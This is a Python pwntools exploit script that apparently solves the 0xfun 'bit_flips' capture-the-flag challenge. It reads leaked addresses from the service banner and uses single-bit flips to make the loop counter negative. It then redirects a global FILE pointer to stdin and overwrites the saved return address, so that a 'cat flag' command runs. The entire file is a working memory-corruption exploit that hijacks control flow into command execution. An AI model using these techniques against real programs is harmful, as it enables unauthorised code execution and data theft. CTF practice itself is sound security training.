#!/usr/bin/env python3
import argparse
import os
import re

from pwn import PIPE, ELF, context, process, remote


HOST = "chall.0xfun.org"
PORT = 19914

MAIN_OFF = 0x1405
F_SLOT_OFF = 0x4050
F_FROM_SBRK = 0x20CF0


def pjoin(base, name):
    return os.path.join(base, name)


def start(args):
    if args.local:
        ld = pjoin(args.dir, "ld-linux-x86-64.so.2")
        libc = pjoin(args.dir, "libc.so.6")
        main = pjoin(args.dir, "main")
        if os.path.exists(ld) and os.path.exists(libc):
            return process([ld, "--library-path", args.dir, main], cwd=args.dir, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return process(main, cwd=args.dir, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return remote(HOST, PORT)


def parse_banner(io):
    banner = io.recvuntil(b"> ")
    main = int(re.search(rb"&main = (0x[0-9a-fA-F]+)", banner).group(1), 16)
    system = int(re.search(rb"&system = (0x[0-9a-fA-F]+)", banner).group(1), 16)
    address = int(re.search(rb"&address = (0x[0-9a-fA-F]+)", banner).group(1), 16)
    brk = int(re.search(rb"sbrk\(NULL\) = (0x[0-9a-fA-F]+)", banner).group(1), 16)
    return main, system, address, brk


def flip(io, addr, bit):
    io.sendline(f"{addr:x}".encode())
    io.sendline(str(bit).encode())
    return io.recvuntil(b"> ", timeout=0.2)


def main():
    ap = argparse.ArgumentParser(description="0xfun bit_flips exploit")
    ap.add_argument("--local", action="store_true", help="run locally with the provided loader/libc")
    ap.add_argument("--dir", default=".", help="directory containing main/libc.so.6/ld-linux-x86-64.so.2")
    ap.add_argument("--debug", action="store_true", help="enable pwntools debug logs")
    args = ap.parse_args()

    context.log_level = "debug" if args.debug else "error"
    libc = ELF(pjoin(args.dir, "libc.so.6"), checksec=False)

    io = start(args)
    main_leak, system_leak, address_leak, brk_leak = parse_banner(io)

    pie = main_leak - MAIN_OFF
    libc_base = system_leak - libc.sym["system"]
    stdin_ptr = libc_base + libc.sym["_IO_2_1_stdin_"]
    f_slot = pie + F_SLOT_OFF
    f_ptr = brk_leak - F_FROM_SBRK

    counter_sign_addr = address_leak - 1
    saved_rip_addr = address_leak + 0x18

    # 1) Turn the signed loop counter negative to get effectively unlimited flips.
    flip(io, counter_sign_addr, 7)

    # 2) Rewrite the global FILE* from the commands file stream to libc stdin.
    diff = f_ptr ^ stdin_ptr
    for byte_idx in range(8):
        byte = (diff >> (8 * byte_idx)) & 0xFF
        for bit in range(8):
            if (byte >> bit) & 1:
                flip(io, f_slot + byte_idx, bit)

    # 3) Return into cmd+1, skipping the initial push rbp.
    flip(io, saved_rip_addr, 3)

    # 4) Restore the sign bit after enough iterations so the loop exits.
    io.sendline(f"{counter_sign_addr:x}".encode())
    io.sendline(b"7")

    # cmd now reads from stdin, so feed a command and close the stream.
    io.sendline(b"cat flag")
    io.shutdown("send")

    out = io.recvall(timeout=3)
    match = re.search(rb"0xfun\{[^}\n]+\}", out)
    if match:
        print(match.group().decode())
    else:
        print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()
